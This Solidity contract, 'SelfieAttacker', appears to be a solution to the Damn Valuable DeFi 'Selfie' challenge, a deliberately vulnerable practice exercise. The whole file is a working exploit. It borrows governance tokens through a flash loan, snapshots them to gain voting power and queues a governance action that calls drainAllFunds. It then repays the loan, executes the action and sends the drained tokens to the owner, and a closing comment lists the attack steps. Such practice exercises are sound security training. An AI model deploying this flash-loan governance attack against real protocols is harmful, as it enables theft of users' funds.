// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
// TODO - create and import an interface for  DamnValuableTokenSnapshot, SelfiePool, and SimpleGovernance
// import ERC20 snapshot from oepnzeppelin 


import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";

import "./Interfaces/IDamnValuableTokenSnapshot.sol";
import "./Interfaces/ISelfiePool.sol";
import "./Interfaces/ISimpleGovernance.sol";
contract SelfieAttacker{

    ERC20Snapshot public dvt;
    IDamnValuableTokenSnapshot public governanceToken;
    ISimpleGovernance public simpleGovernance;
    ISelfiePool public selfiePool;

    address public owner;

    uint256 public actionIDToCall;

    error SenderNotOwner();

    /**
     * 
     * @param _dvtAddress token address of the dvt snapshot which serves as both snapshot and token 
     * @param _governanceTokenAddress governanceTokenAddress
     * @param _simpleGovernanceAddress  simpleGovernance contract address
     * @param _selfiePoolAddress selfie pool that the user will interact with
     */
    constructor(address _dvtAddress, address _governanceTokenAddress, address _simpleGovernanceAddress, address _selfiePoolAddress, address _owner){
        dvt = ERC20Snapshot(_dvtAddress);
        governanceToken = IDamnValuableTokenSnapshot( _governanceTokenAddress);
        simpleGovernance = ISimpleGovernance(_simpleGovernanceAddress);
        selfiePool = ISelfiePool(_selfiePoolAddress);

        owner = _owner;

    }

    function initiateAttack() public{
        // initiate attack by taking flashloan of everything that's in the contract
        selfiePool.flashLoan(1_500_000e18);

    }

    function receiveTokens(address ,uint256 borrow_amount) public{

          // call snapshot to receive your votes
        governanceToken.snapshot();

        //que your malicous function as calldata
        bytes memory maliciousPayload = abi.encodeWithSignature("drainAllFunds(address)", address(this));

        address contractToCall = address(selfiePool);

        // makes a malicious call to 
        actionIDToCall = simpleGovernance.queueAction(contractToCall, maliciousPayload, 0);

        dvt.transfer(address(selfiePool), borrow_amount);

    }
    /**
     * 
     */
    function executeAttack() external onlyOwner {

        simpleGovernance.executeAction(actionIDToCall);

        dvt.transfer(owner, 1_500_000e18);
    }


    modifier onlyOwner {
        if (msg.sender != owner) revert SenderNotOwner();
        _;
        
    }


}

/**
 * POC For attack 
 * 1. Call the flashloan using a receiver in an setup Attack function 
 * 2. in the recieve function make a call to snapshot 
 * 3a. queue the action ( construct calldata that will call the drainfUnds funciton).
 * 3b in the receive function send the dvt tokens right back to the contract. this is possible because you don't have to deposit tokens to que an action 
 * 4. In the execute attack function we are going to call the SimpleGovernance execute Action.
 * 5. Send those tokens directly to the attacker
 */